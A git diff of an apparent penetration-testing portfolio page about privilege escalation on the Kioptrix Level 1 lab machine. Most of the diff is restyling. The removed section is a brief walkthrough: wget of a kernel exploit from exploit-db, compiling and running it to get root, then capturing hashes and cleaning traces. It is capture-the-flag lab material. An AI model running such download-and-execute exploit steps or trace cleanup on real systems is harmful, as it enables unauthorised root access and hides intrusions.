@@ -2,137 +2,123 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Privilege Escalation - Kioptrix</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
-      display: flex;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
       color: white;
-      min-height: 100vh;
+      margin: 0;
+      padding: 0;
     }
 
-    aside {
-      width: 260px;
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    header {
+      padding: 1rem 2rem;
       background-color: rgba(0, 0, 0, 0.6);
-      padding: 2rem 1rem;
-      box-shadow: 2px 0 10px rgba(0,0,0,0.3);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
     }
 
-    aside h2 {
-      font-size: 1.4rem;
+    header div {
+      font-weight: bold;
+      font-size: 1.2rem;
       color: #00ffff;
-      margin-bottom: 1.5rem;
-      text-align: center;
     }
 
-    aside ul { list-style: none; }
-    aside li { margin-bottom: 1rem; }
-    aside a {
-      color: #fff;
+    nav a {
+      color: #00ffff;
       text-decoration: none;
-      display: block;
-      padding: 10px;
-      border-radius: 8px;
-      transition: background 0.2s ease;
+      margin-left: 20px;
+      font-weight: 500;
     }
-    aside a:hover {
-      background-color: rgba(0, 255, 255, 0.2);
-      color: #00ffff;
-    }
+
+    nav a:hover { color: #ffffff; }
 
     main {
-      flex-grow: 1;
       padding: 2rem;
+      max-width: 900px;
+      margin: auto;
     }
 
     h1 {
-      font-size: 2rem;
+      text-align: center;
       color: #00ffff;
-      margin-bottom: 1rem;
+      font-size: 2.2rem;
+      margin-bottom: 0.5rem;
     }
 
     h2 {
-      margin-top: 1.5rem;
-      color: #00bcd4;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 400;
+      color: #cfeef5;
+      margin-bottom: 2rem;
     }
 
-    ul {
-      margin-top: 1rem;
-      padding-left: 1.5rem;
+    .screenshot {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.5rem;
     }
 
-    li {
-      margin-bottom: 0.8rem;
+    .screenshot img {
+      width: 100%;
+      max-width: 600px;
+      border-radius: 10px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
     }
 
-    pre {
-      background-color: rgba(255, 255, 255, 0.08);
-      padding: 0.8rem;
-      border-radius: 8px;
-      overflow-x: auto;
-      margin-top: 0.5rem;
+    .download {
+      text-align: center;
+      margin-top: 2rem;
     }
 
-    code {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 2px 6px;
-      border-radius: 4px;
+    .download a {
+      color: #00ffff;
+      text-decoration: underline;
+      font-weight: bold;
+    }
+
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8rem; }
+      h2 { font-size: 1rem; }
     }
   </style>
 </head>
 <body>
-  <aside>
-    <h2><i class="fas fa-server"></i> Kioptrix L1</h2>
-    <ul>
-      <li><a href="nmap.html"><i class="fas fa-sitemap"></i> Nmap Scan</a></li>
-      <li><a href="enumeration.html"><i class="fas fa-search"></i> Enumeration & Discovery</a></li>
-      <li><a href="vulnerabilities.html"><i class="fas fa-exclamation-triangle"></i> Vulnerabilities</a></li>
-      <li><a href="exploit.html"><i class="fas fa-bug"></i> Exploitation</a></li>
-      <li><a href="privesc.html"><i class="fas fa-user-shield"></i> Privilege Escalation</a></li>
-    </ul>
-  </aside>
+  <header>
+    <div>🔐 Privilege Escalation</div>
+    <nav>
+      <a href="../../../index.html">Home</a>
+      <a href="../../../projects/penetration-testing/full-projects.html">Back</a>
+    </nav>
+  </header>
 
   <main>
-    <h1><i class="fas fa-user-shield"></i> Privilege Escalation</h1>
+    <h1><i class="fas fa-user-shield"></i> Privilege Escalation – Kioptrix</h1>
+    <h2>Post-exploitation techniques to gain root access</h2>
 
-    <h2>Initial Shell</h2>
-    <ul>
-      <li>Shell access obtained as limited user via reverse shell</li>
-      <li>User had no sudo access, so local enumeration was necessary</li>
-    </ul>
+    <section class="screenshot">
+      <img src="../../kioptrix/imgs/privesc-1.jpeg" alt="Privilege escalation attempt 1" />
+      <img src="../../kioptrix/imgs/privesc-2.jpeg" alt="Privilege escalation attempt 2" />
+    </section>
 
-    <h2>Enumeration & Vulnerability Discovery</h2>
-    <ul>
-      <li>Found kernel version: <code>2.4.7</code></li>
-      <li>Search revealed public exploits for privilege escalation via kernel vuln (exploit-db)</li>
-      <li>Verified GCC was available to compile C code on the victim machine</li>
-    </ul>
-
-    <h2>Exploitation</h2>
-    <ul>
-      <li>Downloaded and compiled <code>overflow.c</code> local root exploit from Exploit-DB</li>
-      <li>Executed exploit and received root shell</li>
-    </ul>
-
-    <pre>
-wget http://exploit-db.com/some-exploit.c
-gcc exploit.c -o exploit
-./exploit
-whoami
-→ root
-    </pre>
-
-    <h2>Post-Exploitation</h2>
-    <ul>
-      <li>Captured flags, sensitive files, and user hashes</li>
-      <li>Cleaned up traces where applicable</li>
-    </ul>
+    <div class="download">
+      <p>If the images are not loading or for more detail, <a href="kioptrix_privesc_logbook.pdf" target="_blank">click here to download the PDF</a>.</p>
+    </div>
   </main>
 </body>
 </html>
-
